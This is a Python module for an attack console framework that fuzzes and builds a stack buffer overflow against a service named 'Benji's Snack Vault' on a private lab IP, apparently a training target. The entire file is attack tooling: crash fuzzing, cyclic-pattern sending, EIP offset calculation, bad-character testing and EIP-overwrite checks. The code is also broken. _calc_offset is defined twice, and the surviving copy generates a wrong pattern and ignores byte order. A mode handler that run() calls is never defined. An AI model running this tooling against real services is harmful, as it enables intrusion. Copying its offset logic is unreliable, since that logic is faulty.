# modules/buffer_overflow/benjis_snack_vault_fuzz.py
import socket
import time
import sys
import subprocess
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultFuzz(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_fuzz"
        self.description = "Fuzzer, pattern sender, badchar tester, and offset calculator for Benji's Snack Vault buffer overflow"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix (e.g., MEOW )"},
            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | badchars | test_offset | offset_calc"},
            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Length for pattern mode (auto-used in offset_calc if not set)"},
            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (set after pattern/offset_calc)"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n to payloads (yes/no)"}
        }

        # Remember last pattern length for auto-use in offset_calc
        self.last_pattern_length = 0

    def show_help(self):
        print(colored("\nBenji's Snack Vault Fuzzer Help:", "yellow"))
        print("Modes:")
        print("  fuzz          - Incremental A's to find crash point")
        print("  pattern       - Send unique Metasploit-style pattern for offset discovery")
        print("  badchars      - Send 01-ff bytes after offset to identify bad characters")
        print("  test_offset   - Test EIP overwrite with BBBB at set offset")
        print("  offset_calc   - Calculate offset from EIP value (replaces pattern_offset.rb)")
        print("\nTypical workflow:")
        print("  set MODE fuzz → run → note crash size")
        print("  set PATTERN_LENGTH <crash+500> → set MODE pattern → run → note EIP")
        print("  set MODE offset_calc → run → enter EIP → get offset")
        print("  set OFFSET <result> → set MODE badchars → run → inspect dump")
        print("  set MODE test_offset → run → confirm EIP = 42424242\n")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        mode = opts["MODE"].lower()
        crlf = opts["CRLF"]

        if mode == "fuzz":
            self._run_fuzz(rhost, rport, prefix, crlf)
        elif mode == "pattern":
            self._run_pattern(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
        elif mode == "badchars":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first (from pattern/offset_calc mode)", "red"))
                return
            self._run_badchars(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "test_offset":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first", "red"))
                return
            self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "offset_calc":
            self._run_offset_calc(opts)
        else:
            print(colored(f"[-] Unknown mode: {mode}", "red"))
            print(colored("Valid modes: fuzz, pattern, badchars, test_offset, offset_calc", "yellow"))

    def _send_payload(self, rhost, rport, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((rhost, rport))
            s.send(payload)
            s.close()
            return True
        except Exception as e:
            print(colored(f"[!] Connection failed: {e}", "red"))
            return False

    def _run_fuzz(self, rhost, rport, prefix, crlf):
        print(colored("[*] Fuzz mode - sending increasing A's", "yellow"))
        for size in range(100, 6000, 200):
            junk = b"A" * size
            payload = prefix.encode() + junk
            if crlf:
                payload += b"\r\n"
            print(f"  [+] Sending {len(payload)} bytes...", end="", flush=True)
            if self._send_payload(rhost, rport, payload):
                print(" OK")
            else:
                print(colored(" CRASH/REFUSED!", "red"))
                print(colored(f"[!] Potential crash around {size} junk bytes", "green"))
                break
            time.sleep(0.2)

    def _run_pattern(self, rhost, rport, prefix, length, crlf):
        print(colored(f"[*] Pattern mode - generating {length}-byte pattern", "yellow"))
        try:
            # Call real Metasploit pattern_create.rb
            pattern_output = subprocess.check_output(
                f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}",
                shell=True
            ).decode().strip()
            pattern = pattern_output.encode()
        except Exception as e:
            print(colored(f"[-] Failed to generate pattern: {e}", "red"))
            print(colored("    Make sure Metasploit is installed and pattern_create.rb is in /usr/share/metasploit-framework/tools/exploit/", "yellow"))
            return

        payload = prefix.encode() + pattern
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Pattern sent. Crash in Immunity → note EIP value", "green"))
            print(colored(f"    IMPORTANT: Use length {length} for offset calculation!", "red"))
            print(colored("    Run 'set MODE offset_calc' next and enter the EIP", "yellow"))
            self.last_pattern_length = length
            self.last_pattern = pattern  # Save for offset_calc
        else:
            print(colored("[!] Send failed", "red"))

    def _calc_offset(self, eip_hex, pattern_length):
        if pattern_length == 0 and hasattr(self, 'last_pattern_length') and self.last_pattern_length > 0:
            pattern_length = self.last_pattern_length
            print(colored(f"[*] Using last pattern length: {pattern_length}", "yellow"))

        if pattern_length == 0:
            print(colored("[-] Set PATTERN_LENGTH first (or run pattern mode)", "red"))
            return None

        eip_hex = eip_hex.strip()
        try:
            # Convert EIP hex to bytes (little-endian)
            eip_bytes = bytes.fromhex(eip_hex)
            if len(eip_bytes) != 4:
                print(colored("[-] EIP must be exactly 8 hex digits (4 bytes)", "red"))
                return None

            # Use the last pattern if available, or regenerate
            if hasattr(self, 'last_pattern') and len(self.last_pattern) == pattern_length:
                pattern = self.last_pattern
            else:
                # Regenerate if needed
                pattern_output = subprocess.check_output(
                    f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {pattern_length}",
                    shell=True
                ).decode().strip()
                pattern = pattern_output.encode()

            offset = pattern.find(eip_bytes)
            if offset == -1:
                print(colored("[-] EIP value not found in pattern", "red"))
                print(colored("    Double-check:", "yellow"))
                print(colored("    - EIP is copied correctly (8 hex digits, no spaces)", "yellow"))
                print(colored("    - Same PATTERN_LENGTH used for send and calc", "yellow"))
                print(colored("    - Crash was from this exact pattern run", "yellow"))
                return None

            print(colored(f"[+] Exact match at offset {offset}", "green"))
            return offset

        except Exception as e:
            print(colored(f"[-] Offset calculation failed: {e}", "red"))
            return None
        
    def _calc_offset(self, eip_hex, pattern_length):
        """Calculate offset from EIP value and pattern length (replaces pattern_offset.rb)"""
        try:
            # Convert EIP hex to bytes (little-endian)
            eip_bytes = bytes.fromhex(eip_hex)
            if len(eip_bytes) != 4:
                print(colored("[-] EIP must be exactly 8 hex digits (4 bytes)", "red"))
                return None

            # Generate the same pattern Metasploit uses
            pattern = ""
            i = 0
            while len(pattern) < pattern_length:
                pattern += chr(65 + (i // 26 // 26))  # A-Z
                pattern += chr(97 + (i // 26 % 26))   # a-z
                pattern += str(i % 26)                # 0-9
                i += 1
            pattern = pattern[:pattern_length].encode()

            # Find offset
            offset = pattern.find(eip_bytes)
            if offset == -1:
                print(colored("[-] EIP value not found in pattern", "red"))
                print(colored("    Possible causes:", "yellow"))
                print(colored("    - Wrong PATTERN_LENGTH (must match the one used to send pattern)", "yellow"))
                print(colored("    - Wrong EIP value copied", "yellow"))
                return None

            print(colored(f"[+] Exact match at offset {offset}", "green"))
            return offset

        except Exception as e:
            print(colored(f"[-] Offset calculation failed: {e}", "red"))
            return None

    def _run_badchars(self, rhost, rport, prefix, offset, crlf):
        print(colored("[*] Badchars mode - sending 01-ff after offset", "yellow"))
        badchars = bytearray(b for b in range(1, 256) if b not in [0x00, 0x09, 0x0a, 0x0d])
        junk = b"A" * offset
        eip = b"BBBB"
        payload = prefix.encode() + junk + eip + badchars
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Badchars sent. In Immunity:", "green"))
            print("    1. Crash → right-click ESP → Follow in Dump")
            print("    2. Look for mangled/missing/replaced bytes after BBBB")
            print("    3. Common bad: \\x00 \\x09 \\x0a \\x0d")
        else:
            print(colored("[!] Send failed", "red"))

    def _test_offset(self, rhost, rport, prefix, offset, crlf):
        print(colored(f"[*] Testing offset {offset} with BBBB", "yellow"))
        junk = b"A" * offset
        eip = b"BBBB"
        padding = b"C" * 200
        payload = prefix.encode() + junk + eip + padding
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Sent. In Immunity: check if EIP = 42424242", "green"))
        else:
            print(colored("[!] Send failed", "red"))

    def handle_command(self, cmd):
        cmd_lower = cmd.strip().lower()
        if cmd_lower == "run":
            self.run()
            return
        if cmd_lower == "help":
            self.show_help()
            return
        super().handle_command(cmd)